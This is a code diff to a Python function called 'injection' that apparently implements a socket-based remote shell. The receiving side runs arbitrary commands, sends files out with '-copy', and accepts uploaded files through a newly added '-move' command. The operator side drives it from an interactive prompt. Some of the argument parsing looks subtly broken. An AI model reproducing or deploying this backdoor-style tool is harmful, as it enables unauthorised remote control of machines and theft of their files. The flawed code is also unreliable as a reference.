@@ -113,13 +113,18 @@ def injection(h, c):
                     data = conn.recv(buffer).decode('utf-8')
                     if data.strip().split()[0] == '-chdir':
                         os.chdir(data.strip().split()[1])
-                        conn.send(bytes(os.getcwd(), 'utf-8'))
                     elif data.strip().split()[0] == '-copy':
                         file_name = ' '.join(data.strip().split()[len(data[0]):])
                         with open(file_name, 'r') as file:
                             content = file.read()
                         conn.send(bytes(file_name, 'utf-8'))
                         conn.send(bytes(content, 'utf-8'))
+                    elif data.strip().split()[0] == '-move':
+                        file_name = conn.recv(buffer).decode('utf-8')
+                        file_data = conn.recv(buffer).decode('utf-8')
+                        with open(file_name, 'w') as file:
+                            file.write(file_data)
+                        conn.send(bytes(f'File: {file_name} has been copied to {os.getcwd()}', 'utf-8'))
                     elif data == '-quit':
                         quit(0)
                     else:
@@ -130,7 +135,6 @@ def injection(h, c):
                             conn.send(bytes(f'Command failed: {e}'))
                         print(f'({datetime.now().time()}) Command executed: {data}')
             quit(0)
-
     elif c:
         host, port = c
         try:
@@ -152,7 +156,7 @@ def injection(h, c):
             print('\nCaution! if you send a incorrect command, the connection will be lost\n')
             while True:
                 path = s.recv(buffer).decode('utf-8')
-                command = str(input(f'{host}/{path}>>> '))
+                command = str(input(f'{path}>>> '))
                 if command.split()[0] == '-copy':
                     s.sendall(bytes(command, 'utf-8'))
                     file_name = s.recv(buffer).decode('utf-8')
@@ -160,9 +164,20 @@ def injection(h, c):
                     with open(file_name, 'w') as file:
                         file.write(file_data)
                     print(f'{file_name} has been copied to {os.getcwd()}')
+                elif command.split()[0] == '-move':
+                    file_name = ' '.join(command.strip().split()[len(command[0]):])
+                    s.send(bytes('-move', 'utf-8'))
+                    with open(file_name, 'r') as file:
+                        content = file.read()
+                    s.send(bytes(file_name, 'utf-8'))
+                    s.send(bytes(content, 'utf-8'))
+                    msg = s.recv(buffer).decode('utf-8')
+                    print(msg)
                 elif command.split()[0] == '-quit':
                     s.sendall(bytes(command, 'utf-8'))
                     quit(0)
+                elif command.split()[0] == '-chdir':
+                    s.sendall(bytes(command, 'utf-8'))
                 else:
                     s.sendall(bytes(command, 'utf-8'))
                     print(s.recv(buffer).decode('utf-8'))
